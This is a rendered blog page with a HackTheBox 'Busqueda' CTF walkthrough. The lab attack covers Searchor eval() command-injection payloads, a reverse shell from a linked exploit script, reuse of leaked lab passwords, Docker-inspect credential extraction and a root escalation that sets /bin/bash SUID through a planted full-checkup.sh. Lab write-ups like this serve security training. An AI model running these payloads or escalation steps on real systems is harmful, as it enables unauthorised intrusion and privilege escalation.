@@ -1,0 +1,636 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Busqueda Writeup - HackTheBox | Rezy Dev</title>
+<meta name="keywords" content="HackTheBox, Linux, Easy, NetSecFocus, TJNull">
+<meta name="description" content="Busqueda is an easy Linux machine involving command injection in a Python module for initial access. Privilege escalation is achieved by abusing a root-executable system checkup script with a relative path vulnerability, discovered via Gitea creds and repo analysis.">
+<meta name="author" content="Me">
+<link rel="canonical" href="http://localhost:1313/writeups/hackthebox/busqueda/">
+<meta name="google-site-verification" content="XYZabc">
+<meta name="yandex-verification" content="XYZabc">
+<meta name="msvalidate.01" content="XYZabc">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.c8cc592602af07182c5c77ec685d5a345edaf450c20eb609706f559cb037baef.css" integrity="sha256-yMxZJgKvBxgsXHfsaF1aNF7a9FDCDrYJcG9VnLA3uu8=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/writeups/hackthebox/busqueda/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript><style>
+    @media screen and (min-width: 769px) {
+         
+        .post-content input[type="checkbox"]:checked ~ label > img {
+            transform: scale(1.6);
+            cursor: zoom-out;
+            position: relative;
+            z-index: 999;
+        }
+    
+        .post-content img.zoomCheck {
+            transition: transform 0.15s ease;
+            z-index: 999;
+            cursor: zoom-in;
+        }
+    }
+    </style><meta property="og:url" content="http://localhost:1313/writeups/hackthebox/busqueda/">
+  <meta property="og:site_name" content="Rezy Dev">
+  <meta property="og:title" content="Busqueda Writeup - HackTheBox">
+  <meta property="og:description" content="Busqueda is an easy Linux machine involving command injection in a Python module for initial access. Privilege escalation is achieved by abusing a root-executable system checkup script with a relative path vulnerability, discovered via Gitea creds and repo analysis.">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="writeups">
+    <meta property="article:published_time" content="2024-10-26T00:00:00+00:00">
+    <meta property="article:modified_time" content="2024-10-26T00:00:00+00:00">
+    <meta property="article:tag" content="HackTheBox">
+    <meta property="article:tag" content="Linux">
+    <meta property="article:tag" content="Easy">
+    <meta property="article:tag" content="NetSecFocus">
+    <meta property="article:tag" content="TJNull">
+    <meta property="og:image" content="http://localhost:1313/feature.png">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://localhost:1313/feature.png">
+<meta name="twitter:title" content="Busqueda Writeup - HackTheBox">
+<meta name="twitter:description" content="Busqueda is an easy Linux machine involving command injection in a Python module for initial access. Privilege escalation is achieved by abusing a root-executable system checkup script with a relative path vulnerability, discovered via Gitea creds and repo analysis.">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Writeups",
+      "item": "http://localhost:1313/writeups/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "HackTheBox",
+      "item": "http://localhost:1313/writeups/hackthebox/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  3 ,
+      "name": "Busqueda Writeup - HackTheBox",
+      "item": "http://localhost:1313/writeups/hackthebox/busqueda/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Busqueda Writeup - HackTheBox",
+  "name": "Busqueda Writeup - HackTheBox",
+  "description": "Busqueda is an easy Linux machine involving command injection in a Python module for initial access. Privilege escalation is achieved by abusing a root-executable system checkup script with a relative path vulnerability, discovered via Gitea creds and repo analysis.",
+  "keywords": [
+    "HackTheBox", "Linux", "Easy", "NetSecFocus", "TJNull"
+  ],
+  "articleBody": " Link: https://app.hackthebox.com/machines/Busqueda Difficulty Easy Machine Linux Enumeration Nmap Scan 22/tcp open ssh syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIzAFurw3qLK4OEzrjFarOhWslRrQ3K/MDVL2opfXQLI+zYXSwqofxsf8v2MEZuIGj6540YrzldnPf8CTFSW2rk= | 256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPTtbUicaITwpKjAQWp8Dkq1glFodwroxhLwJo6hRBUK 80/tcp open http syn-ack Apache httpd 2.4.52 |_http-title: Did not follow redirect to http://searcher.htb/ |_http-server-header: Apache/2.4.52 (Ubuntu) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel Port 80 (http) I added searcher.htb to my /etc/hosts file and checked the site. This is what the site looks like: After exploring the site and performing enumeration, such as directory fuzzing, I noticed that the site uses Flask and Searchor 2.4.0. Here, Searchor 2.4.0 is vulnerable to command injection.\nExplanation of the Vulnerability In file src/sarchor/main.py of Searchor \u003c= 2.4.2 there is a function call eval():\n@click.argument(\"query\") def search(engine, query, open, copy): try: url = eval( # \u003c\u003c\u003c HERE f\"Engine.{engine}.search('{query}', copy_url={copy}, open_web={open})\" ) click.echo(url) searchor.history.update(engine, query, url) if open: click.echo(\"opening browser...\") ... This makes it vulnerable to command injection since the input isn’t sanitized. We can use the following payloads for command injection:\n__import__('os').system('') __import__('os').popen('').read() etc PoC \u0026 Exploit I found a nice little exploit for this here: Exploit for Searchor 2.4.0 - Arbitrary CMD Injection.\nAll I did was clone the repository and run the exploit.sh proof-of-concept script they provided. I ran the following command while also having netcat listening on port 1337. After the script executes, I see a reverse shell of the user svc pop up in our listener, and we also obtain our user.txt flag.\nPrivilege Escalation to Root I looked around the system and found two nice info. At /home/svc there is a folder .gitconfig:\nsvc@busqueda:~$ cat .gitconfig cat .gitconfig [user] email = cody@searcher.htb name = cody [core] hooksPath = no-hooks I looked around the system and found two interesting pieces of information. In /home/svc, there is a folder named .gitconfig: Here, credentials are supplied using the URL scheme to gitea.searcher.htb. I will add this to my /etc/hosts file and then try to access it. I might use the credentials there to find something useful.\nAnd yes, cody:jh1usoih2bkjaspwe92 worked! Yay! However, I didn’t find anything useful on the website.\nI performed a random sudo -l check with the credentials above, and since the user is Cody, password reuse must be the case for the user Cody in this situation. And yes! It worked.\nsvc@busqueda:/var/www/app/.git$ sudo -l -S [sudo] password for svc: jh1usoih2bkjaspwe92 Matching Defaults entries for svc on busqueda: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty User svc may run the following commands on busqueda: (root) /usr/bin/python3 /opt/scripts/system-checkup.py * And we have a possible vector for root as well. However, the fact that we can’t read the source code for this file means we are restricted to execute permission here.\nI tried the following test argument, which lets us know the allowed arguments.\nsvc@busqueda:/opt/scripts$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py test ",
+  "wordCount" : "1087",
+  "inLanguage": "en",
+  "image":"http://localhost:1313/feature.png","datePublished": "2024-10-26T00:00:00Z",
+  "dateModified": "2024-10-26T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "Me"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "http://localhost:1313/writeups/hackthebox/busqueda/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Rezy Dev",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "http://localhost:1313/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class=" dark" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="rezydev.xyz (Alt + H)">rezydev.xyz</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://localhost:1313/about/" title="👨🏼‍💻 About">
+                    <span>👨🏼‍💻 About</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/writeups/" title="✍️ Writeups">
+                    <span>✍️ Writeups</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/archives/" title="📂 Archives">
+                    <span>📂 Archives</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/tags/" title="🏷️ Tags">
+                    <span>🏷️ Tags</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/search/" title="🔍 Search (Alt &#43; /)" accesskey=/>
+                    <span>🔍 Search</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="http://localhost:1313/">Home</a>&nbsp;»&nbsp;<a href="http://localhost:1313/writeups/">Writeups</a>&nbsp;»&nbsp;<a href="http://localhost:1313/writeups/hackthebox/">HackTheBox</a></div>
+    <h1 class="post-title entry-hint-parent">
+      Busqueda Writeup - HackTheBox
+    </h1>
+    <div class="post-description">
+      Busqueda is an easy Linux machine involving command injection in a Python module for initial access. Privilege escalation is achieved by abusing a root-executable system checkup script with a relative path vulnerability, discovered via Gitea creds and repo analysis.
+    </div>
+    <div class="post-meta"><span title='2024-10-26 00:00:00 +0000 UTC'>October 26, 2024</span>&nbsp;·&nbsp;6 min&nbsp;·&nbsp;1087 words&nbsp;·&nbsp;Me&nbsp;|&nbsp;<a href="https://github.com/Rezy-Dev/Rezy-Dev.github.io/tree/master/content/writeups/HackTheBox/Busqueda/index.md" rel="noopener noreferrer" target="_blank">Suggest Changes</a>
+
+</div>
+  </header> 
+<figure class="entry-cover">
+            <img loading="eager" src="http://localhost:1313/writeups/hackthebox/busqueda/feature.png" alt="">
+        
+</figure><div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#nmap-scan">Nmap Scan</a></li>
+      </ul>
+    </li>
+    <li><a href="#port-80-http">Port 80 (http)</a>
+      <ul>
+        <li><a href="#explanation-of-the-vulnerability">Explanation of the Vulnerability</a></li>
+        <li><a href="#poc--exploit">PoC &amp; Exploit</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><table>
+  <thead>
+      <tr>
+          <th>Link:</th>
+          <th><a href="https://app.hackthebox.com/machines/Busqueda">https://app.hackthebox.com/machines/Busqueda</a></th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>Difficulty</td>
+          <td>Easy</td>
+      </tr>
+      <tr>
+          <td>Machine</td>
+          <td>Linux</td>
+      </tr>
+  </tbody>
+</table>
+<hr>
+<h1 id="enumeration">Enumeration<a hidden class="anchor" aria-hidden="true" href="#enumeration">#</a></h1>
+<h3 id="nmap-scan">Nmap Scan<a hidden class="anchor" aria-hidden="true" href="#nmap-scan">#</a></h3>
+<pre tabindex="0"><code>22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIzAFurw3qLK4OEzrjFarOhWslRrQ3K/MDVL2opfXQLI+zYXSwqofxsf8v2MEZuIGj6540YrzldnPf8CTFSW2rk=
+|   256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPTtbUicaITwpKjAQWp8Dkq1glFodwroxhLwJo6hRBUK
+80/tcp open  http    syn-ack Apache httpd 2.4.52
+|_http-title: Did not follow redirect to http://searcher.htb/
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre><h2 id="port-80-http">Port 80 (http)<a hidden class="anchor" aria-hidden="true" href="#port-80-http">#</a></h2>
+<p>I added <code>searcher.htb</code> to my <code>/etc/hosts</code> file and checked the site. This is what the site looks like:
+
+    
+    <input type="checkbox" id="zoomCheck-2b8e7" hidden>
+    <label for="zoomCheck-2b8e7">
+        <img class="zoomCheck" loading="lazy" decoding="async" 
+            src="assets/Pasted%20image%2020241026095230.png" alt="" 
+             />
+    </label></p>
+<p>After exploring the site and performing enumeration, such as directory fuzzing, I noticed that the site uses Flask and Searchor 2.4.0. Here, Searchor 2.4.0 is vulnerable to command injection.</p>
+<h3 id="explanation-of-the-vulnerability">Explanation of the Vulnerability<a hidden class="anchor" aria-hidden="true" href="#explanation-of-the-vulnerability">#</a></h3>
+<p>In file <strong><code>src/sarchor/main.py</code></strong> of <strong><code>Searchor &lt;= 2.4.2</code></strong> there is a function call <strong><code>eval()</code></strong>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="nd">@click.argument</span><span class="p">(</span><span class="s2">&#34;query&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">search</span><span class="p">(</span><span class="n">engine</span><span class="p">,</span> <span class="n">query</span><span class="p">,</span> <span class="nb">open</span><span class="p">,</span> <span class="n">copy</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">url</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span> <span class="c1"># &lt;&lt;&lt; HERE </span>
+</span></span><span class="line"><span class="cl">            <span class="sa">f</span><span class="s2">&#34;Engine.</span><span class="si">{</span><span class="n">engine</span><span class="si">}</span><span class="s2">.search(&#39;</span><span class="si">{</span><span class="n">query</span><span class="si">}</span><span class="s2">&#39;, copy_url=</span><span class="si">{</span><span class="n">copy</span><span class="si">}</span><span class="s2">, open_web=</span><span class="si">{</span><span class="nb">open</span><span class="si">}</span><span class="s2">)&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">click</span><span class="o">.</span><span class="n">echo</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">searchor</span><span class="o">.</span><span class="n">history</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">engine</span><span class="p">,</span> <span class="n">query</span><span class="p">,</span> <span class="n">url</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">open</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">click</span><span class="o">.</span><span class="n">echo</span><span class="p">(</span><span class="s2">&#34;opening browser...&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	  <span class="o">...</span>
+</span></span></code></pre></div><p>This makes it vulnerable to command injection since the input isn&rsquo;t sanitized. We can use the following payloads for command injection:</p>
+<ul>
+<li><code>__import__('os').system('&lt;CMD&gt;')</code></li>
+<li><code>__import__('os').popen('&lt;CMD&gt;').read()</code></li>
+<li><code>etc</code></li>
+</ul>
+<h3 id="poc--exploit">PoC &amp; Exploit<a hidden class="anchor" aria-hidden="true" href="#poc--exploit">#</a></h3>
+<p>I found a nice little exploit for this here: <a href="https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection">Exploit for Searchor 2.4.0 - Arbitrary CMD Injection</a>.</p>
+<p>All I did was clone the repository and run the <code>exploit.sh</code> proof-of-concept script they provided. I ran the following command while also having netcat listening on port 1337.
+
+    
+    <input type="checkbox" id="zoomCheck-e891f" hidden>
+    <label for="zoomCheck-e891f">
+        <img class="zoomCheck" loading="lazy" decoding="async" 
+            src="assets/Pasted%20image%2020241026100435.png" alt="" 
+             />
+    </label></p>
+<p>After the script executes, I see a reverse shell of the user <code>svc</code> pop up in our listener, and we also obtain our <code>user.txt</code> flag.</p>
+<p>
+    
+    <input type="checkbox" id="zoomCheck-804eb" hidden>
+    <label for="zoomCheck-804eb">
+        <img class="zoomCheck" loading="lazy" decoding="async" 
+            src="assets/Pasted%20image%2020241026100554.png" alt="" 
+             />
+    </label></p>
+<h1 id="privilege-escalation-to-root">Privilege Escalation to Root<a hidden class="anchor" aria-hidden="true" href="#privilege-escalation-to-root">#</a></h1>
+<p>I looked around the system and found two nice info. At <code>/home/svc</code> there is a folder <code>.gitconfig</code>:</p>
+<pre tabindex="0"><code>svc@busqueda:~$ cat .gitconfig
+cat .gitconfig
+[user]
+	email = cody@searcher.htb
+	name = cody
+[core]
+	hooksPath = no-hooks
+</code></pre><p>I looked around the system and found two interesting pieces of information. In <code>/home/svc</code>, there is a folder named <code>.gitconfig</code>:
+
+    
+    <input type="checkbox" id="zoomCheck-abbbd" hidden>
+    <label for="zoomCheck-abbbd">
+        <img class="zoomCheck" loading="lazy" decoding="async" 
+            src="assets/Pasted%20image%2020241026104949.png" alt="" 
+             />
+    </label></p>
+<p>Here, credentials are supplied using the URL scheme to <code>gitea.searcher.htb</code>. I will add this to my <code>/etc/hosts</code> file and then try to access it. I might use the credentials there to find something useful.</p>
+<p>And yes, <code>cody:jh1usoih2bkjaspwe92</code> worked! Yay! However, I didn&rsquo;t find anything useful on the website.</p>
+<p>I performed a random <code>sudo -l</code> check with the credentials above, and since the user is Cody, password reuse must be the case for the user Cody in this situation. And yes! It worked.</p>
+<pre tabindex="0"><code>svc@busqueda:/var/www/app/.git$ sudo -l -S
+[sudo] password for svc: jh1usoih2bkjaspwe92
+Matching Defaults entries for svc on busqueda:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User svc may run the following commands on busqueda:
+    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
+</code></pre><p>And we have a possible vector for root as well. However, the fact that we can&rsquo;t read the source code for this file means we are restricted to execute permission here.</p>
+<p>I tried the following test argument, which lets us know the allowed arguments.</p>
+<pre tabindex="0"><code>svc@busqueda:/opt/scripts$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py test
+&lt;usr/bin/python3 /opt/scripts/system-checkup.py test
+Usage: /opt/scripts/system-checkup.py &lt;action&gt; (arg1) (arg2)
+
+     docker-ps     : List running docker containers
+     docker-inspect : Inpect a certain docker container
+     full-checkup  : Run a full system checkup
+</code></pre><p>Using <code>sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps</code> lists two containers running: <code>gitea</code> and <code>mysql</code>.</p>
+<p>We can probably retrieve some sort of credentials from the MySQL container. We can try using <code>docker inspect</code>.</p>
+<pre tabindex="0"><code>svc@busqueda:/opt/scripts$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect
+&lt;thon3 /opt/scripts/system-checkup.py docker-inspect
+Usage: /opt/scripts/system-checkup.py docker-inspect &lt;format&gt; &lt;container_name&gt;
+</code></pre><p>We need the format and the container name in order to inspect the Docker container. We know the container name, but we need the format. I found this: <a href="https://docs.docker.com/engine/cli/formatting/">Docker Formatting Documentation</a>, which explains how the formatting works.</p>
+<p>So I ran the following command (the <code>jq .</code> part is for JSON formatting; learn more about <code>jq</code> <a href="https://jqlang.github.io/jq/">here</a>):</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo python3 /opt/scripts/system-checkup.py docker-inspect <span class="s1">&#39;{{json .}}&#39;</span> gitea <span class="p">|</span> jq .
+</span></span></code></pre></div><p>I also found the database password here:</p>
+<pre tabindex="0"><code>&#34;Env&#34;: [
+      &#34;USER_UID=115&#34;,
+      &#34;USER_GID=121&#34;,
+      &#34;GITEA__database__DB_TYPE=mysql&#34;,
+      &#34;GITEA__database__HOST=db:3306&#34;,
+      &#34;GITEA__database__NAME=gitea&#34;,
+      &#34;GITEA__database__USER=gitea&#34;,
+      &#34;GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh&#34;,
+      &#34;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&#34;,
+      &#34;USER=git&#34;,
+      &#34;GITEA_CUSTOM=/data/gitea&#34;
+    ]
+</code></pre><p>I&rsquo;m not sure how useful the database password might be, but let&rsquo;s see.<br>
+I want the instance&rsquo;s IP address. For that, I found this formatting on <a href="https://docs.docker.com/reference/cli/docker/inspect/#examples">this site</a>:
+
+    
+    <input type="checkbox" id="zoomCheck-4da4c" hidden>
+    <label for="zoomCheck-4da4c">
+        <img class="zoomCheck" loading="lazy" decoding="async" 
+            src="assets/Pasted%20image%2020241026110824.png" alt="" 
+             />
+    </label></p>
+<p>I will modify it for my use case like this:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo python3 /opt/scripts/system-checkup.py docker-inspect <span class="s1">&#39;{{json .NetworkSettings.Networks}}&#39;</span> mysql_db <span class="p">|</span> jq .
+</span></span></code></pre></div><p>Which outputs the following:</p>
+<pre tabindex="0"><code>{
+  &#34;docker_gitea&#34;: {
+    &#34;IPAMConfig&#34;: null,
+    &#34;Links&#34;: null,
+    &#34;Aliases&#34;: [
+      &#34;f84a6b33fb5a&#34;,
+      &#34;db&#34;
+    ],
+    &#34;NetworkID&#34;: &#34;cbf2c5ce8e95a3b760af27c64eb2b7cdaa71a45b2e35e6e03e2091fc14160227&#34;,
+    &#34;EndpointID&#34;: &#34;bf915680ed570128582ba98f8f91606a9941f07c1b0bf344155b9bb360722475&#34;,
+    &#34;Gateway&#34;: &#34;172.19.0.1&#34;,
+    &#34;IPAddress&#34;: &#34;172.19.0.3&#34;,
+    &#34;IPPrefixLen&#34;: 16,
+    &#34;IPv6Gateway&#34;: &#34;&#34;,
+    &#34;GlobalIPv6Address&#34;: &#34;&#34;,
+    &#34;GlobalIPv6PrefixLen&#34;: 0,
+    &#34;MacAddress&#34;: &#34;02:42:ac:13:00:03&#34;,
+    &#34;DriverOpts&#34;: null
+  }
+}
+</code></pre><p>I know the IP address, database username, and database password, so let&rsquo;s try to connect to the MySQL database.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mysql -h 172.19.0.3 -u gitea -pyuiu1hoiu4i5ho1uh gitea
+</span></span></code></pre></div><p>I tried to extract all user information, but it didn&rsquo;t fit properly in the terminal.
+
+    
+    <input type="checkbox" id="zoomCheck-b1e81" hidden>
+    <label for="zoomCheck-b1e81">
+        <img class="zoomCheck" loading="lazy" decoding="async" 
+            src="assets/Pasted%20image%2020241026112027.png" alt="" 
+             />
+    </label></p>
+<p>So I only tried to display interesting information, so I used the query <code>SELECT name, email, passwd FROM user;</code>, which reveals the user&rsquo;s password here.
+
+    
+    <input type="checkbox" id="zoomCheck-45523" hidden>
+    <label for="zoomCheck-45523">
+        <img class="zoomCheck" loading="lazy" decoding="async" 
+            src="assets/Pasted%20image%2020241026112219.png" alt="" 
+             />
+    </label></p>
+<p>I tried to crack the password but had no success. After a while, I reused the database password as the administrator&rsquo;s password to see if the admin credentials and database credentials were the same.</p>
+<p>To my surprise, <code>administrator:yuiu1hoiu4i5ho1uh</code> worked, and I am in.</p>
+<p>There is a private repository in the admin profile, which contains the scripts we found in the <code>/opt/scripts</code> directory. Since we now have the source code for these scripts, we may try to use them to exploit the script and gain root access.
+
+    
+    <input type="checkbox" id="zoomCheck-3ba14" hidden>
+    <label for="zoomCheck-3ba14">
+        <img class="zoomCheck" loading="lazy" decoding="async" 
+            src="assets/Pasted%20image%2020241026112517.png" alt="" 
+             />
+    </label></p>
+<p>Since we are most interested in <code>system-checkup.py</code>, as the user <code>svc</code> can run it as root, I looked at its source code and found something interesting. The script runs <code>./full-checkup.sh</code> when we supply the argument <code>full-checkup</code>.
+
+    
+    <input type="checkbox" id="zoomCheck-541f9" hidden>
+    <label for="zoomCheck-541f9">
+        <img class="zoomCheck" loading="lazy" decoding="async" 
+            src="assets/Pasted%20image%2020241026112840.png" alt="" 
+             />
+    </label></p>
+<p>If we run <code>system-checkup.py</code> with the argument <code>full-checkup</code>, it prints <code>&quot;Something went wrong&quot;</code>.
+
+    
+    <input type="checkbox" id="zoomCheck-58f61" hidden>
+    <label for="zoomCheck-58f61">
+        <img class="zoomCheck" loading="lazy" decoding="async" 
+            src="assets/Pasted%20image%2020241026113105.png" alt="" 
+             />
+    </label></p>
+<p>You may ask why. It&rsquo;s because of the <code>try-except</code> block being used. It attempts to run <code>./full-checkup.sh</code>, but since the file isn&rsquo;t present in the current directory from which we are running the script, it fails.</p>
+<p>We can now try to exploit the <code>system-checkup.py</code> script by creating our own <code>full-checkup.sh</code> script in the <code>/tmp</code> directory and running the command from there. In our custom-made script <code>full-checkup.sh</code>, I will essentially make <code>/bin/bash</code> a SUID executable binary so I can easily gain root access.</p>
+<p>I created the following script and granted it execute permission.</p>
+<pre tabindex="0"><code>svc@busqueda:/tmp$ cat full-checkup.sh 
+#!/bin/bash
+
+chmod u+s /bin/bash
+</code></pre><p>Now I will run the following command, and we should have our bash binary set as a SUID executable.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
+</span></span></code></pre></div><p>
+    
+    <input type="checkbox" id="zoomCheck-4ab73" hidden>
+    <label for="zoomCheck-4ab73">
+        <img class="zoomCheck" loading="lazy" decoding="async" 
+            src="assets/Pasted%20image%2020241026114407.png" alt="" 
+             />
+    </label></p>
+<p>We no longer receive the <code>&quot;Something went wrong&quot;</code> error, which means our bash script ran successfully. We should have root access now.
+
+    
+    <input type="checkbox" id="zoomCheck-6ebde" hidden>
+    <label for="zoomCheck-6ebde">
+        <img class="zoomCheck" loading="lazy" decoding="async" 
+            src="assets/Pasted%20image%2020241026114647.png" alt="" 
+             />
+    </label></p>
+<h1 id="conclusion">Conclusion<a hidden class="anchor" aria-hidden="true" href="#conclusion">#</a></h1>
+<p>Thanks for reading my walkthrough. This box was nice and was part of TJNull&rsquo;s &ldquo;<a href="https://docs.google.com/spreadsheets/u/1/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/htmlview#">NetSecFocus Trophy Room</a>.</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="http://localhost:1313/tags/hackthebox/">HackTheBox</a></li>
+      <li><a href="http://localhost:1313/tags/linux/">Linux</a></li>
+      <li><a href="http://localhost:1313/tags/easy/">Easy</a></li>
+      <li><a href="http://localhost:1313/tags/netsecfocus/">NetSecFocus</a></li>
+      <li><a href="http://localhost:1313/tags/tjnull/">TJNull</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="http://localhost:1313/writeups/ctf/learn-how-eval-function-is-evil-for-discord-bots/">
+    <span class="title">« Prev</span>
+    <br>
+    <span>Why You Shouldn&#39;t Use eval() in Discord Bots (or in Any App)</span>
+  </a>
+  <a class="next" href="http://localhost:1313/writeups/hackthebox/blurry/">
+    <span class="title">Next »</span>
+    <br>
